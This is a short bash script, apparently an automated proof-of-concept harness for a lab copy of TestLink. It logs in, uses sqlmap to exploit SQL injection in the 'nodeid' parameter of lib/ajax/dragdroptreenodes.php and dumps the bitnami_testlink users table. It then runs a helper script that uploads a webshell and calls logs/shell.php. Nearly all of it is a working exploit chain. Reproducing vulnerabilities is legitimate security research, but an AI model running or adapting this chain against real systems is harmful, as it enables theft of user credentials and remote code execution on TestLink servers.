#!/bin/bash
while [ "$STATUS" != "200" ]
do
    sleep 1
    STATUS=$(curl -sL -w "%{http_code}" http://web -o /dev/null)
    echo "config wait for init"
done
sleep 30
tar -xvzf /opt/poc/geckodriver-v0.26.0-linux64.tar.gz 
chmod +x geckodriver 
cp geckodriver /usr/local/bin/ 
geckodriver --version
echo "start"
sleep 10
apt-get install wget
python3 /opt/poc/login.py http://web
#sqlmap dump users table
sum=0
declare -a indexed_arr
for line in `cat  temp`
do
    indexed_arr[sum]=$line
    echo ${indexed_arr[sum]}
    sum+=1
done
wget 'https://github.com/sqlmapproject/sqlmap/tarball/master' --output-document=./sqlmapproject-sqlmap.tar.gz
mkdir ./sqlmap && tar -xzvf sqlmapproject-sqlmap.tar.gz -C ./sqlmap --strip-components 1 >>1.txt
cd sqlmap
python3 sqlmap.py --version

python3 sqlmap.py -u http://web/lib/ajax/dragdroptreenodes.php --data="doAction=changeParent&oldparentid=41&newparentid=41&nodelist=47%2C45&nodeorder=0&nodeid=47" -p nodeid --cookie="PHPSESSID=${indexed_arr[0]};TESTLINK1920TESTLINK_USER_AUTH_COOKIE=${indexed_arr[1]}" --dump -D bitnami_testlink -T users   --answers="follow=n"  -v  0 >> 1.txt

#upload webshell
python3 /opt/poc/poc.py http://web
cat temp
curl http://web/logs/shell.php
echo "poc ok"